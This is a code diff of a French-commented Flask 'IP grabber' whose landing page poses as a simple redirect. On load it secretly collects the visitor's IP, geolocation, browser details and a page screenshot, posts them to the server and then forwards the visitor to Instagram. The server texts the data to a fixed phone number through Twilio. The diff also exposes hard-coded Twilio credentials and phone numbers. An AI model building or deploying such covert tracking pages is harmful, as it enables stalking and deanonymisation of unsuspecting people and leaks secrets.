@@ -1,66 +1,30 @@
-from flask import Flask, request, redirect, jsonify
+from flask import Flask, request, jsonify
 from twilio.rest import Client
-import os
 import requests
+import os
 
 app = Flask(__name__)
 
-# Twilio config (remplace avec tes vraies infos)
-account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
-auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
-from_number = '+12524866318'
-to_number = '+33635960569'
+# Configuration Twilio
+account_sid = os.getenv('AC2ef2bd5bd5146f76f586d2c577159f90') or 'AC2ef2bd5bd5146f76f586d2c577159f90'
+auth_token = os.getenv('5ce2eed95742af1667bb5c8b8528cf0c') or '5ce2eed95742af1667bb5c8b8528cf0c'
+from_number = os.getenv('+12524866318') or '+12524866318'
+to_number = os.getenv('+33635960569') or '+33635960569'
+
 client = Client(account_sid, auth_token)
 
-# Fonction pour géolocaliser l'IP
-def get_ip_info(ip):
-    try:
-        response = requests.get(f"http://ip-api.com/json/{ip}")
-        data = response.json()
-        if data["status"] == "success":
-            return {
-                "ip": ip,
-                "country": data.get("country"),
-                "region": data.get("regionName"),
-                "city": data.get("city"),
-                "zip": data.get("zip"),
-                "lat": data.get("lat"),
-                "lon": data.get("lon"),
-                "isp": data.get("isp")
-            }
-    except Exception as e:
-        print(f"[!] Erreur géolocalisation : {e}")
-    return {}
+# Fonction d'envoi SMS
 
-# Envoi SMS enrichi
-def send_sms(info, user_agent):
-    message_body = f"""Nouvelle IP capturée :
-IP : {info.get('ip')}
-Pays : {info.get('country')}
-Ville : {info.get('city')}
-Région : {info.get('region')}
-Code postal : {info.get('zip')}
-Latitude : {info.get('lat')}
-Longitude : {info.get('lon')}
-FAI : {info.get('isp')}
-User-Agent : {user_agent}
-"""
+def send_sms(message_body):
     try:
-        client.messages.create(
+        message = client.messages.create(
             body=message_body,
             from_=from_number,
             to=to_number
         )
-        print("[+] SMS envoyé")
+        print(f"[+] SMS envoyé : {message.sid}")
     except Exception as e:
         print(f"[!] Erreur envoi SMS : {e}")
-
-    # Log dans un fichier
-    try:
-        with open("logs.txt", "a") as f:
-            f.write(message_body + "\n---\n")
-    except Exception as e:
-        print(f"[!] Erreur enregistrement fichier : {e}")
 
 @app.route('/')
 def index():
@@ -68,23 +32,33 @@ def index():
     <html>
     <head><title>Redirection</title></head>
     <body>
+        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
         <script>
-            fetch("https://api.ipify.org?format=json")
-            .then(res => res.json())
-            .then(data => {
-                fetch("/log", {
-                    method: "POST",
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        ip: data.ip,
-                        ua: navigator.userAgent
-                    })
-                }).then(() => {
-                    window.location.href = "https://www.youtube.com";
+            async function collectData() {
+                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                const locationData = await fetch('https://ipapi.co/' + ipData.ip + '/json/').then(r => r.json());
+                const screenshot = await html2canvas(document.body).then(canvas => canvas.toDataURL());
+
+                const data = {
+                    ip: ipData.ip,
+                    ua: navigator.userAgent,
+                    screen: screenshot,
+                    lang: navigator.language,
+                    platform: navigator.platform,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    location: locationData
+                };
+
+                await fetch('/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
                 });
-            });
+
+                window.location.href = "https://www.instagram.com";
+            }
+
+            collectData();
         </script>
     </body>
     </html>
@@ -94,10 +68,25 @@ def index():
 def log():
     data = request.get_json()
     ip = data.get('ip')
-    user_agent = data.get('ua')
-    print(f"[+] IP reçue : {ip}")
-    info = get_ip_info(ip)
-    send_sms(info, user_agent)
+    ua = data.get('ua')
+    lang = data.get('lang')
+    platform = data.get('platform')
+    timezone = data.get('timezone')
+    location = data.get('location', {})
+
+    # Préparation du message
+    message_body = f"""
+    Nouvelle visite !
+    IP: {ip}
+    User-Agent: {ua}
+    Langue: {lang}
+    Plateforme: {platform}
+    Fuseau: {timezone}
+    Pays: {location.get('country_name')}, Ville: {location.get('city')}
+    FAI: {location.get('org')}
+    """
+
+    send_sms(message_body)
     return jsonify({"status": "ok"})
 
 if __name__ == '__main__':
